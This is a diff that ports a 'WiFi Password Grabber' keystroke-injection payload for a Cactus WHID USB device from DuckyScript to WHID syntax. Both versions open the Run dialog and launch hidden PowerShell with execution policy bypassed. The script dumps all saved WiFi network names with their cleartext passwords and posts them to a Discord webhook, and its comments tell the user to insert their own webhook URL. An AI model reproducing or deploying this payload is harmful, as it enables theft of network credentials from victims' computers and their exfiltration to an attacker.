@@ -1,10 +1,8 @@
-REM === Cactus WHID Payload: WiFi Password Grabber ===
-REM Target: Windows 10/11
-REM Category: Recon & Exfil
-REM Description: Extracts all saved WiFi SSIDs and cleartext passwords, sends to Discord
-REM Replace: DISCORD_WEBHOOK_URL_HERE with your webhook URL
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "$r='';(netsh wlan show profiles)|Select-String '\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\W+\:(.+)$';if($p){$r+=\"$n : $($p.Matches.Groups[1].Value.Trim())`n\"}};$body=@{content=\"``````$r``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
-ENTER
+Rem: Cactus WHID Payload - WiFi Password Grabber
+Rem: Target - Windows 10/11
+Rem: Extracts all saved WiFi SSIDs and cleartext passwords, sends to Discord
+Rem: Replace DISCORD_WEBHOOK_URL_HERE with your webhook URL
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$r='';(netsh wlan show profiles)|Select-String '\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\W+\:(.+)$';if($p){$r+=\"$n : $($p.Matches.Groups[1].Value.Trim())`n\"}};$body=@{content=\"``````$r``````\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"
